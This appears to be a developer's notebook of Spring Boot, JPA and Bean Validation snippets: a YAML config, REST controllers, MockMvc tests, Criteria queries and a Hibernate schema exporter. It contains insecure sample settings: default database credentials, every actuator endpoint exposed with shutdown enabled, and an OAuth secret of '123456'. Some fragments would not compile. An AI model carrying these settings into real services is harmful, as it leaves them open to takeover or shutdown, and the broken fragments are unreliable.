    url: jdbc:postgresql://localhost:5432/distributor
    username: postgres
    password: postgres
    driver-class-name: org.postgresql.Driver
    sql-script-encoding: utf-8
    hikari:
      minimum-idle: 5
      maximum-pool-size: 25
      idle-timeout: 30000
      isolate-internal-queries: true
      connection-test-query: SELECT current_timestamp
  jpa:
    show-sql: true
    open-in-view: false
    generate-ddl: false
    database: postgresql
    hibernate:
      ddl-auto: none
      properties:
        hibernate:
          dialect: org.hibernate.dialect.PostgreSQL9Dialect
          ddl-auto: none
          cache:
            use_query_cache: false
            use_second_level_cache: false
          jdbc.lob.non_contextual_creation: true
          temp.use_jdbc_metadata_defaults: false
          current_session_context_class: org.hibernate.context.internal.ThreadLocalSessionContext
  liquibase:
    change-log: classpath:/db/db.changelog-master.xml
    enabled: false

springfox:
  documentation:
    swagger:
      v2:
        path: /swagger-api

security:
  role:
    admin:
      code: 1
      paths: /api/admin/**
  rsa:
    modulus: y3YZPtr7MB94Tnwj9Je9fdnjwhenVEj5GdZEVcauTZtSSglkryujtRkNdhEiF7gjyJAMycg2AobYE33xiKsZvUdiKMKvvSNVjoG4M3KXBOkJTfKS6LefMCk/B0AqVBAzdrWBrpO3xvnuVLoAqCpUF4MWyqGwJO4sKWuRqSNX+fRtsXTSBQ4X7gbrvGyS7zRRsHAg1S7D9o6Sl8o7sFNNxSr82W2YD1MlWM1/3+v+uvGuEbWIxzb0nWtThV5j8gib0gknl/Mb78uor/jMi46IeBSPftQYtzwjZHe5T+V8BscwpGli2Y+XWFGJNoSa6DwxZxGSNB7DI6j+Ev46B+IC5Q==
    exponent: AQAB
  jwt:
    claim-names:
      user-id: userid
      owner-id: ownerid
      user-role: userrole
      expiration: exp

management:
  info:
    build:
      enabled: false
  endpoint:
    shutdown:
      enabled: true
    health:
      show-details: ALWAYS
  endpoints:
    web:
      exposure:
        include: '*'
      base-path: /api
      path-mapping:
        info: status

api-status:
  node:
    name: ${java.rmi.server.hostname:localhost}
  # build properties from maven
  build:
    groupId: '@project.groupId@'
    artifactId: '@project.artifactId@'
    version: '@project.version@'
    name: '@project.name@'
    timestamp: '@maven.build.timestamp@'

logging:
  config:

info:
  # application info
  app:
    name: '@project.name@'
    description: '@project.description@'
  # environment variables
  env:
    java:
      vendor: ${java.specification.vendor}
      vm-name: ${java.vm.name}
      runtime-version: ${java.runtime.version}
-------------------------------------------------------------------------------------------------------
    /**
     * Returns {@code T} mapped item by input {@link Object} source and {@link ModelMapperType}
     *
     * @param source - initial input input {@link Object} source
     * @param type   - initial input {@link ModelMapperType}
     * @param <T>    type of mapped item
     * @return {@code T} mapped item
     */
    protected <T> T map(final Object source, final TypeToken<T> type) {
        return this.getModelMapper().map(source, type.getType());
//        return safeCast(this.getModelMapper().map(source, type.getType()), type.getRawType());
    }
-------------------------------------------------------------------------------------------------------
    public static final <T> TypeToken<T> getTypeToken() {
        return new TypeToken<T>() {
        };
    }

    public interface MetaDataKey<T> extends Serializable {
        TypeToken<T> getTypeToken();

        String getName();
    }

    public enum StringKeys implements MetaDataKey<Iterable<ProductModelResponse>> {
        A1;

        @Override
        public TypeToken<Iterable<ProductModelResponse>> getTypeToken() {
            return Iterable.class;
        }

        @Override
        public String getName() {
            return getDeclaringClass().getName() + "." + name();
        }
    }

-------------------------------------------------------------------------------------------------------
package org.jboss.tutorial.callback.bean;

import javax.persistence.PreRemove;
import javax.persistence.PostRemove;
import javax.persistence.PreUpdate;
import javax.persistence.PostUpdate;
import javax.persistence.PostLoad;
import javax.persistence.PrePersist;
import javax.persistence.PostPersist;

/**
 * @author <a href="mailto:kabir.khan@jboss.org">Kabir Khan</a>
 * @version $Revision: 57207 $
 */
public class CustomerCallbackListener
{
   @PrePersist
   public void doPrePersist(Customer customer)
   {
      System.out.println("doPrePersist: About to create Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PostPersist
   public void doPostPersist(Object customer)
   {
      System.out.println("doPostPersist: Created Customer: " + ((Customer)customer).getFirst() + " " + ((Customer)customer).getLast());
   }

   @PreRemove
   public void doPreRemove(Customer customer)
   {
      System.out.println("doPreRemove: About to delete Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PostRemove
   public void doPostRemove(Customer customer)
   {
      System.out.println("doPostRemove: Deleted Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PreUpdate
   public void doPreUpdate(Customer customer)
   {
      System.out.println("doPreUpdate: About to update Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PostUpdate
   public void doPostUpdate(Customer customer)
   {
      System.out.println("doPostUpdate: Updated Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PostLoad
   public void doPostLoad(Customer customer)
   {
      System.out.println("doPostLoad: Loaded Customer: " + customer.getFirst() + " " + customer.getLast());
   }


}

-------------------------------------------------------------------------------------------------------
import javax.persistence.DiscriminatorColumn;
import javax.persistence.DiscriminatorType;
import javax.persistence.DiscriminatorValue;
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.Id;
import javax.persistence.Inheritance;
import javax.persistence.InheritanceType;
import javax.persistence.Table;


@Entity
public class Employee extends Customer {
   private int employeeId;

   public int getEmployeeId() { return employeeId; }
   public void setEmployeeId(int id) { employeeId = id; }
}


@Entity
@DiscriminatorValue("CUST")
class Customer extends Person {
   private String street;
   private String city;
   private String state;
   private String zip;
   
   public String getStreet() { return street; }
   public void setStreet(String street) { this.street = street; }

   public String getCity() { return city; }
   public void setCity(String city) { this.city = city; }

   public String getState() { return state; }
   public void setState(String state) { this.state = state; }

   public String getZip() { return zip; }
   public void setZip(String zip) { this.zip = zip; }
}


@Entity
@Table(name="PERSON_HIERARCHY")
@Inheritance(strategy=InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name="DISCRIMINATOR",
                     discriminatorType=DiscriminatorType.STRING)
@DiscriminatorValue("PERSON")
class Person implements java.io.Serializable
{
   private int id;
   private String firstName;
   private String lastName;

   @Id @GeneratedValue
   public int getId() { return id; }
   public void setId(int id) { this.id = id; }

   public String getFirstName() { return firstName; }
   public void setFirstName(String first) { this.firstName = first; }

   public String getLastName() { return lastName; }
   public void setLastName(String last) { this.lastName = last; }
}
    
-------------------------------------------------------------------------------------------------------
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.SpringApplicationConfiguration;
import org.springframework.http.MediaType;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.mock.http.MockHttpOutputMessage;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.context.web.WebAppConfiguration;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import java.io.IOException;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.is;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;
import static org.springframework.test.web.servlet.setup.MockMvcBuilders.webAppContextSetup;

/**
 * @author Josh Long
 */
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = Application.class)
@WebAppConfiguration
public class BookmarkRestControllerTest {


    private MediaType contentType = new MediaType(MediaType.APPLICATION_JSON.getType(),
            MediaType.APPLICATION_JSON.getSubtype(),
            Charset.forName("utf8"));

    private MockMvc mockMvc;

    private String userName = "bdussault";

    private HttpMessageConverter mappingJackson2HttpMessageConverter;

    private Account account;

    private List<Bookmark> bookmarkList = new ArrayList<>();

    @Autowired
    private BookmarkRepository bookmarkRepository;

    @Autowired
    private WebApplicationContext webApplicationContext;

    @Autowired
    private AccountRepository accountRepository;

    @Autowired
    void setConverters(HttpMessageConverter<?>[] converters) {

        this.mappingJackson2HttpMessageConverter = Arrays.asList(converters).stream().filter(
                hmc -> hmc instanceof MappingJackson2HttpMessageConverter).findAny().get();

        Assert.assertNotNull("the JSON message converter must not be null",
                this.mappingJackson2HttpMessageConverter);
    }

    @Before
    public void setup() throws Exception {
        this.mockMvc = webAppContextSetup(webApplicationContext).build();

        this.bookmarkRepository.deleteAllInBatch();
        this.accountRepository.deleteAllInBatch();

        this.account = accountRepository.save(new Account(userName, "password"));
        this.bookmarkList.add(bookmarkRepository.save(new Bookmark(account, "http://bookmark.com/1/" + userName, "A description")));
        this.bookmarkList.add(bookmarkRepository.save(new Bookmark(account, "http://bookmark.com/2/" + userName, "A description")));
    }

    @Test
    public void userNotFound() throws Exception {
        mockMvc.perform(post("/george/bookmarks/")
                .content(this.json(new Bookmark()))
                .contentType(contentType))
                .andExpect(status().isNotFound());
    }

    @Test
    public void readSingleBookmark() throws Exception {
        mockMvc.perform(get("/" + userName + "/bookmarks/"
                + this.bookmarkList.get(0).getId()))
                .andExpect(status().isOk())
                .andExpect(content().contentType(contentType))
                .andExpect(jsonPath("$.id", is(this.bookmarkList.get(0).getId().intValue())))
                .andExpect(jsonPath("$.uri", is("http://bookmark.com/1/" + userName)))
                .andExpect(jsonPath("$.description", is("A description")));
    }

    @Test
    public void readBookmarks() throws Exception {
        mockMvc.perform(get("/" + userName + "/bookmarks"))
                .andExpect(status().isOk())
                .andExpect(content().contentType(contentType))
                .andExpect(jsonPath("$", hasSize(2)))
                .andExpect(jsonPath("$[0].id", is(this.bookmarkList.get(0).getId().intValue())))
                .andExpect(jsonPath("$[0].uri", is("http://bookmark.com/1/" + userName)))
                .andExpect(jsonPath("$[0].description", is("A description")))
                .andExpect(jsonPath("$[1].id", is(this.bookmarkList.get(1).getId().intValue())))
                .andExpect(jsonPath("$[1].uri", is("http://bookmark.com/2/" + userName)))
                .andExpect(jsonPath("$[1].description", is("A description")));
    }

    @Test
    public void createBookmark() throws Exception {
        String bookmarkJson = json(new Bookmark(
                this.account, "http://spring.io", "a bookmark to the best resource for Spring news and information"));
        this.mockMvc.perform(post("/" + userName + "/bookmarks")
                .contentType(contentType)
                .content(bookmarkJson))
                .andExpect(status().isCreated());
    }

    protected String json(Object o) throws IOException {
        MockHttpOutputMessage mockHttpOutputMessage = new MockHttpOutputMessage();
        this.mappingJackson2HttpMessageConverter.write(
                o, MediaType.APPLICATION_JSON, mockHttpOutputMessage);
        return mockHttpOutputMessage.getBodyAsString();
    }
}
-------------------------------------------------------------------------------------------------------
keytool -genkey -alias bookmarks -keyalg RSA -keystore src/main/resources/tomcat.keystore
-------------------------------------------------------------------------------------------------------
@Configuration
class WebSecurityConfiguration extends GlobalAuthenticationConfigurerAdapter {

	@Autowired
	AccountRepository accountRepository;

	@Override
	public void init(AuthenticationManagerBuilder auth) throws Exception {
		auth.userDetailsService(userDetailsService());
	}

	@Bean
	UserDetailsService userDetailsService() {
		return (username) -> accountRepository
				.findByUsername(username)
				.map(a -> new User(a.username, a.password, true, true, true, true,
						AuthorityUtils.createAuthorityList("USER", "write")))
				.orElseThrow(
						() -> new UsernameNotFoundException("could not find the user '"
								+ username + "'"));
	}
}
-------------------------------------------------------------------------------------------------------

@Configuration
@EnableResourceServer
@EnableAuthorizationServer
class OAuth2Configuration extends AuthorizationServerConfigurerAdapter {

	String applicationName = "bookmarks";

	// This is required for password grants, which we specify below as one of the
	// {@literal authorizedGrantTypes()}.
	@Autowired
	AuthenticationManagerBuilder authenticationManager;

	@Override
	public void configure(AuthorizationServerEndpointsConfigurer endpoints)
			throws Exception {
		// Workaround for https://github.com/spring-projects/spring-boot/issues/1801
		endpoints.authenticationManager(new AuthenticationManager() {
			@Override
			public Authentication authenticate(Authentication authentication)
					throws AuthenticationException {
				return authenticationManager.getOrBuild().authenticate(authentication);
			}
		});
	}

	@Override
	public void configure(ClientDetailsServiceConfigurer clients) throws Exception {

		clients.inMemory().withClient("android-" + applicationName)
				.authorizedGrantTypes("password", "authorization_code", "refresh_token")
				.authorities("ROLE_USER").scopes("write").resourceIds(applicationName)
				.secret("123456");
	}
}

class BookmarkResource extends ResourceSupport {

	private final Bookmark bookmark;

	public BookmarkResource(Bookmark bookmark) {
		String username = bookmark.getAccount().getUsername();
		this.bookmark = bookmark;
		this.add(new Link(bookmark.uri, "bookmark-uri"));
		this.add(linkTo(BookmarkRestController.class, username).withRel("bookmarks"));
		this.add(linkTo(
				methodOn(BookmarkRestController.class, username).readBookmark(null,
						bookmark.getId())).withSelfRel());
	}

	public Bookmark getBookmark() {
		return bookmark;
	}
}
-------------------------------------------------------------------------------------------------------
  /** POST /newss -> Create a new news. */
  @RequestMapping(
      value = "/newss",
      method = RequestMethod.POST,
      produces = MediaType.APPLICATION_JSON_VALUE)
  @Timed
  public ResponseEntity<News> createNews(@Valid @RequestBody News news) throws URISyntaxException {
    log.debug("REST request to save News : {}", news);
    if (news.getId() != null) {
      return ResponseEntity.badRequest()
          .headers(
              HeaderUtil.createFailureAlert(
                  "news", "idexists", "A new news cannot already have an ID"))
          .body(null);
    }
    News result = newsRepository.save(news);
    List<Subscription> subscriptions =
        subscriptionRepository
            .findAll()
            .stream()
            .filter(item -> (item.getIdMarketPlace().equals(result.getMarketPlace().getId())))
            .collect(Collectors.toList());
    String title = result.getMarketPlace().getName() + " vous a envoyé une News !";
    String content = result.getTitle() + "\n\n\n" + result.getContent();

    for (Subscription subscription : subscriptions) {
      mailService.sendEmail(subscription.getUser().getEmail(), title, content, false, false);
    }
    return ResponseEntity.created(new URI("/api/newss/" + result.getId()))
        .headers(HeaderUtil.createEntityCreationAlert("news", result.getId().toString()))
        .body(result);
  }
-------------------------------------------------------------------------------------------------------
 /**
   * POST /users : Creates a new user.
   *
   * <p>Creates a new user if the login and email are not already used, and sends an mail with an
   * activation link. The user needs to be activated on creation.
   *
   * @param managedUserVM the user to create
   * @return the ResponseEntity with status 201 (Created) and with body the new user, or with status
   *     400 (Bad Request) if the login or email is already in use
   * @throws URISyntaxException if the Location URI syntax is incorrect
   */
  @PostMapping("/users")
  @Timed
  @Secured(AuthoritiesConstants.ADMIN)
  public ResponseEntity<?> createUser(@RequestBody ManagedUserVM managedUserVM)
      throws URISyntaxException {
    log.debug("REST request to save User : {}", managedUserVM);

    // Lowercase the user login before comparing with database
    if (userRepository.findOneByLogin(managedUserVM.getLogin().toLowerCase()).isPresent()) {
      return ResponseEntity.badRequest()
          .headers(
              HeaderUtil.createFailureAlert("userManagement", "userexists", "Login already in use"))
          .body(null);
    } else if (userRepository.findOneByEmail(managedUserVM.getEmail()).isPresent()) {
      return ResponseEntity.badRequest()
          .headers(
              HeaderUtil.createFailureAlert(
                  "userManagement", "emailexists", "Email already in use"))
          .body(null);
    } else {
      User newUser = userService.createUser(managedUserVM);
      mailService.sendCreationEmail(newUser);
      return ResponseEntity.created(new URI("/api/users/" + newUser.getLogin()))
          .headers(HeaderUtil.createAlert("userManagement.created", newUser.getLogin()))
          .body(newUser);
    }
  }
-------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {
        MockHttpServletRequestBuilder builder =
                                      MockMvcRequestBuilders.post("/test")
                                        .header("testHeader",
                                                "headerValue")
                                        .content("test body");
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
					
@Controller
@RequestMapping
public class MyController {

   @RequestMapping("/user")
    public ResponseEntity<String> handleUserRequest (RequestEntity<User> requestEntity) {
        User user = requestEntity.getBody();
        System.out.println("request body: " + user);
        System.out.println("request headers " + requestEntity.getHeaders());
        System.out.println("request method : " + requestEntity.getMethod());

        MultiValueMap<String, String> headers = new HttpHeaders();
        headers.put("Cache-Control", Arrays.asList("max-age=3600"));

        ResponseEntity<String> responseEntity = new ResponseEntity<>("my response body",
                                                                     headers,
                                                                     HttpStatus.OK);
        return responseEntity;
    }
}

@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {

        MockHttpServletRequestBuilder builder =
                                   MockMvcRequestBuilders.post("/user")
                                        .header("testHeader",
                                                "headerValue")
                                        .contentType(MediaType.APPLICATION_JSON)
                                        .content(createUserInJson("joe",
                                                            "joe@example.com"));
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
    }

    private static String createUserInJson (String name, String email) {
        return "{ \"name\": \"" + name + "\", " +
                            "\"emailAddress\":\"" + email + "\"}";
    }
}
-------------------------------------------------------------------------------------------------------
  public class User {
    @NotNull(groups = GroupUserName.class)
    String firstName;
    @NotNull(groups = GroupUserName.class)
    String lastName;

    @NotNull(groups = GroupAddress.class)
    String streetAddress;
    @NotNull(groups = GroupAddress.class)
    String country;
    @NotNull(groups = GroupAddress.class)
    @Size(min = 5, groups = GroupAddress.class)
    String zipCode;

    @NotNull
    String userId;

    //getters and setters
  }
  
     validator.validate(user, GroupUserName.class,
                      GroupAddress.class, Default.class);
					  
import javax.validation.GroupSequence;
import javax.validation.groups.Default;

@GroupSequence({Default.class, GroupUserName.class, GroupAddress.class})
public interface GroupSequenceForUser {
}

 @GroupSequence({User2.class, GroupUserName.class, GroupAddress.class})
 public class User2 {
    @NotNull(groups = GroupUserName.class)
    String firstName;
    @NotNull(groups = GroupUserName.class)
    String lastName;

    @NotNull(groups = GroupAddress.class)
    String streetAddress;
    @NotNull(groups = GroupAddress.class)
    String country;
    @NotNull(groups = GroupAddress.class)
    @Size(min = 5, groups = GroupAddress.class)
    String zipCode;

    @NotNull
    String userId;

   // getters and setters
}
-------------------------------------------------------------------------------------------------------
    TestBean test = new TestBean();
    int[] testNumbers = test.findNumbers();

    Method method = TestBean.class.getDeclaredMethod("findNumbers");

    ExecutableValidator executableValidator = validator.forExecutables();
    Set<ConstraintViolation<TestBean>> violations =
                            executableValidator.validateReturnValue(test,
                                                method, testNumbers);

    if (violations.size() > 0) {
        violations.stream().forEach(MethodReturnValidationExample::printError);
    } else {
        //proceed using TestBean object
    }
-------------------------------------------------------------------------------------------------------
    public class User {
        private final String name;
        private final String phone;

        public User (@NotNull String name,
                     @NotNull
                     @Pattern(regexp = "(\\d){3,3}-\\d{3,3}-\\d{4,4}",
                     message = "must match 111-111-1111 format")
                     String phone) {
            this.name = name;
            this.phone = phone;
        }
      ....
    }
	
	public class Test{
    public static void main (String[] args) throws NoSuchMethodException {

        javax.validation.Validator validator =  ....

        String userName = null;
        String userPhone = "223-223-222";

        ExecutableValidator executableValidator = validator.forExecutables();

        Set<ConstraintViolation<User>> constraintViolations =
                            executableValidator.validateConstructorParameters(
                              User.class.getConstructor(String.class, String.class),
                                                 new  Object[]{userName, userPhone});

        if (constraintViolations.size() > 0) {
            constraintViolations.stream().forEach(Test::printError);
        } else {
            User user = new User(userName, userPhone);
            System.out.println(user);
        }
    }

    private static void printError (
                        ConstraintViolation<User> violation) {
        System.out.println(violation.getPropertyPath() + " " + violation.getMessage());
    }
-------------------------------------------------------------------------------------------------------
    .................. 
    CriteriaUpdate<Employee> criteriaUpdate = criteriaBuilder.createCriteriaUpdate(Employee.class);
    Root<Employee> employeeRoot = criteriaUpdate.from(Employee.class);
    criteriaUpdate.set(employeeRoot.get(Employee_.salary),
            criteriaBuilder.sum(employeeRoot.get(Employee_.salary), 500d))
                  .where(criteriaBuilder.equal(employeeRoot.get(Employee_.DEPT), "IT"));
    //the equivalent JPQL
    //UPDATE Employee e SET e.salary = e.salary + 500 WHERE e.dept = 'IT'
    entityManager.getTransaction().begin();
    int i = entityManager.createQuery(criteriaUpdate).executeUpdate();
    System.out.println("Entities updated: " + i);
    entityManager.getTransaction().commit();
    ..................
-------------------------------------------------------------------------------------------------------
SHOW COLUMNS from person
-------------------------------------------------------------------------------------------------------
https://www.logicbig.com/tutorials/java-ee-tutorial/bean-validation/predefined_constraints.html

  private static EntityManagerFactory entityManagerFactory = Persistence.createEntityManagerFactory("example-unit");
  
  private static void findEmployees() {
      EntityManager entityManager = entityManagerFactory.createEntityManager();
      CriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();
      CriteriaQuery<Employee> criteriaQuery = criteriaBuilder.createQuery(Employee.class);
      Root<Employee> root = criteriaQuery.from(Employee.class);
      criteriaQuery.select(root);

      System.out.println("-- All employees --");
      List<Employee> resultList = entityManager.createQuery(criteriaQuery).getResultList();
      resultList.forEach(System.out::println);


      System.out.println("-- All employees from IT dept --");
      criteriaQuery.where(criteriaBuilder.equal(root.get(Employee_.DEPT), "IT"));
      List<Employee> resultList2 = entityManager.createQuery(criteriaQuery).getResultList();
      resultList2.forEach(System.out::println);

      entityManager.close();
  }

  private static void findEmployees2() {
      EntityManager entityManager = entityManagerFactory.createEntityManager();
      CriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();
      CriteriaQuery<Object[]> criteriaQuery = criteriaBuilder.createQuery(Object[].class);
      Root<Employee> root = criteriaQuery.from(Employee.class);

      System.out.println("-- Employees name and salary --");
      criteriaQuery.multiselect(root.get(Employee_.NAME), root.get(Employee_.SALARY));
      List<Object[]> resultList = entityManager.createQuery(criteriaQuery).getResultList();
      resultList.forEach(arr -> System.out.println(Arrays.toString(arr)));

      System.out.println("-- Employees name and dept --");
      criteriaQuery.multiselect(root.get(Employee_.NAME), root.get(Employee_.DEPT));
      List<Object[]> resultList2 = entityManager.createQuery(criteriaQuery).getResultList();
      resultList2.forEach(arr -> System.out.println(Arrays.toString(arr)));

      entityManager.close();
  }
  
  CriteriaQuery<Item> query = criteriaBuilder.createQuery(Item.class);
  Root<Customer> customer = query.from(Customer.class);
  ListJoin<Order, Item> items = customer.join(Customer_.orders)
                                        .join(Order_.items);
  query.select(items)
       .where(criteriaBuilder.equal(customer.get(Customer_.shipmentInfo)
                                    .get(ShipmentInfo_.address)
                                    .get(Address_.state), "NJ"));
									
  CriteriaQuery<Employee> criteriaQuery = criteriaBuilder.createQuery(Employee.class);
   Root<Employee> employee = criteriaQuery.from(Employee.class);
   criteriaQuery.select(employee)
                .where(criteriaBuilder.isMember(criteriaBuilder.literal("222-222-222"),
                                                    employee.get(Employee_.phoneNumbers)));
  TypedQuery<Employee> typedQuery = entityManager.createQuery(criteriaQuery);
  List<Employee> list = typedQuery.getResultList();
  
  
 CriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();
  CriteriaQuery<Employee> query = criteriaBuilder.createQuery(Employee.class);
  Root<Employee> employee = query.from(Employee.class);
  employee.fetch(Employee_.tasks, JoinType.INNER);
  query.select(employee)
       .distinct(true);
  TypedQuery<Employee> typedQuery = entityManager.createQuery(query);
  List<Employee> resultList = typedQuery.getResultList();
  
  
  private static void findEmployeesWithTasks() {
      System.out.println("-- find employees with tasks --");
      EntityManager em = entityManagerFactory.createEntityManager();
      CriteriaBuilder cb = em.getCriteriaBuilder();
      CriteriaQuery<Employee> query = cb.createQuery(Employee.class);
      Root<Employee> employee = query.from(Employee.class);
      employee.fetch(Employee_.tasks, JoinType.LEFT);
      query.select(employee)
           .distinct(true);
      TypedQuery<Employee> typedQuery = em.createQuery(query);
      List<Employee> resultList = typedQuery.getResultList();
      for (Employee e : resultList) {
          System.out.println(e.getName() + " - " + e.getTasks());
      }
  }
  
  CriteriaBuilder cb = em.getCriteriaBuilder(); 
  CriteriaQuery<Employee> query = cb.createQuery(Employee.class);//create query object
  Root<Employee> employee = query.from(Employee.class);//create object representing 'from' part
  query.select(employee);//create 'select from' part
  query.orderBy(
        cb.asc(employee.get(Employee_.dept)),
        cb.desc(employee.get(Employee_.salary))
   );
   
@Entity
@NamedQuery(name = Employee.SALARY_RANGE_QUERY,
      query = "SELECT e FROM Employee e WHERE e.salary BETWEEN :min AND :max order by e.salary")
@NamedQuery(name = Employee.SALARY_LESS_THAN_AVERAGE_QUERY,
      query = "SELECT e FROM Employee e where  e.salary < (SELECT AVG(e2.salary) FROM Employee e2)")
public class Employee {
  public static final String SALARY_RANGE_QUERY = "salaryRangeQuery";
  public static final String SALARY_LESS_THAN_AVERAGE_QUERY = "salaryLessThanAverageQuery";
  @Id
  @GeneratedValue
  private long id;
  private String name;
  private Timestamp joinDate;
  private long salary;
    .............
}

  private static void findEmployeeBySalaryRange() {
      System.out.println("-- Employee by salary range --");
      EntityManager em = entityManagerFactory.createEntityManager();
      Query query = em.createNamedQuery(Employee.SALARY_RANGE_QUERY);
      query.setParameter("min", 2000L);
      query.setParameter("max", 4000L);
      List<Employee> resultList = query.getResultList();
      resultList.forEach(System.out::println);
      em.close();
  }

  private static void findEmployeeWithLessThanAverageSalary() {
      System.out.println("-- Employee with salary less than average --");
      EntityManager em = entityManagerFactory.createEntityManager();
      Query query = em.createNamedQuery(Employee.SALARY_LESS_THAN_AVERAGE_QUERY);
      List<Employee> resultList = query.getResultList();
      resultList.forEach(System.out::println);
      em.close();
  }

  public static void persistEmployees() {
      Employee employee1 = Employee.create("Diana", 3000, LocalDate.of(1999, 11, 15));
      Employee employee2 = Employee.create("Rose", 4000, LocalDate.of(2011, 5, 1));
      Employee employee3 = Employee.create("Denise", 1500, LocalDate.of(2006, 1, 10));
      Employee employee4 = Employee.create("Mike", 2000, LocalDate.of(2015, 8, 20));
      EntityManager em = entityManagerFactory.createEntityManager();
      em.getTransaction().begin();
      em.persist(employee1);
      em.persist(employee2);
      em.persist(employee3);
      em.persist(employee4);
      em.getTransaction().commit();
      em.close();
  }

  private static Timestamp localToTimeStamp(LocalDate date) {
      return Timestamp.from(date.atStartOfDay().toInstant(ZoneOffset.UTC));
  }
-------------------------------------------------------------------------------------------------------
  public static void main(String[] args) throws Exception {
      EntityManagerFactory emf =
              Persistence.createEntityManagerFactory("example-unit");
      try {
          persistEntities(emf);
          runTypeEqualsQuery(emf);
          runTypeInQuery(emf);
          runTypeNotInQuery(emf);
      } finally {
          emf.close();
      }
  }

  private static void persistEntities(EntityManagerFactory emf) throws Exception {
      System.out.println("-- Persisting entities --");
      EntityManager em = emf.createEntityManager();
      em.getTransaction().begin();
      for (Employee employee : createEmployees()) {
          em.persist(employee);
      }
      em.getTransaction().commit();
  }

  private static void runTypeEqualsQuery(EntityManagerFactory emf) {
      System.out.println("-- running TYPE with '=' query --");
      EntityManager em = emf.createEntityManager();
      List<Employee> entityAList = em.createQuery("SELECT t FROM Employee t WHERE TYPE(t) = FullTimeEmployee")
                                     .getResultList();
      entityAList.forEach(System.out::println);
      em.close();
  }

  private static void runTypeInQuery(EntityManagerFactory emf) {
      System.out.println("-- running TYPE with 'IN' query --");
      EntityManager em = emf.createEntityManager();
      List<Employee> entityAList =
              em.createQuery("SELECT t FROM Employee t WHERE TYPE(t) IN (ContractEmployee, PartTimeEmployee)")
                .getResultList();
      entityAList.forEach(System.out::println);
      em.close();
  }

  private static void runTypeNotInQuery(EntityManagerFactory emf) {
      System.out.println("-- running TYPE NOT 'IN' query --");
      EntityManager em = emf.createEntityManager();
      List<Employee> entityAList =
              em.createQuery("SELECT t FROM Employee t WHERE TYPE(t) NOT IN (ContractEmployee, PartTimeEmployee)")
                .getResultList();
      entityAList.forEach(System.out::println);
      em.close();
  }
-------------------------------------------------------------------------------------------------------
public final class HibernateExporter {

    private static final Logger LOG = LoggerFactory.getLogger(HibernateExporter.class);
    private static final String OUTPUT_FILE = "schema.sql";
    private static final String DIALECT = "org.hibernate.dialect.H2Dialect";

    private List<String> entityPackages;

    private HibernateExporter(List<String> entityPackages) {
        this.entityPackages = entityPackages;
    }

    public static void main(String[] args) {
        final List<String> entityPackages = Collections.singletonList("pakage.with.entites");

        HibernateExporter exporter = new HibernateExporter(entityPackages);
        exporter.export();
    }

    private void export() {
        SchemaExport export = new SchemaExport();
        export.setOutputFile(OUTPUT_FILE);
        export.setFormat(true);
        export.setDelimiter(";");
        EnumSet<TargetType> types = EnumSet.of(TargetType.SCRIPT);
        Metadata metadata = createMetadataSources().buildMetadata();
        export.execute(types, Action.CREATE, metadata);
    }

    private MetadataSources createMetadataSources() {
        MetadataSources metadata = new MetadataSources(
                new StandardServiceRegistryBuilder()
                        .applySetting("hibernate.dialect", DIALECT)
                        .build());

        for (String entityPackage : entityPackages) {
            final Reflections reflections = new Reflections(entityPackage);
            for (Class<?> cl : reflections.getTypesAnnotatedWith(MappedSuperclass.class)) {
                metadata.addAnnotatedClass(cl);
                LOG.info(String.format("Mapped = %s", cl.getName()));
            }
            for (Class<?> cl : reflections.getTypesAnnotatedWith(Entity.class)) {
                metadata.addAnnotatedClass(cl);
                LOG.info(String.format("Mapped = %s", cl.getName()));
            }
        }
        return metadata;
    }
}
-------------------------------------------------------------------------------------------------------
os: Visual Studio 2015

install:
  - ps: |
      Add-Type -AssemblyName System.IO.Compression.FileSystem
      if (!(Test-Path -Path "C:\maven" )) {
        (new-object System.Net.WebClient).DownloadFile(
          'http://www.us.apache.org/dist/maven/maven-3/3.3.9/binaries/apache-maven-3.3.9-bin.zip',
          'C:\maven-bin.zip'
        )
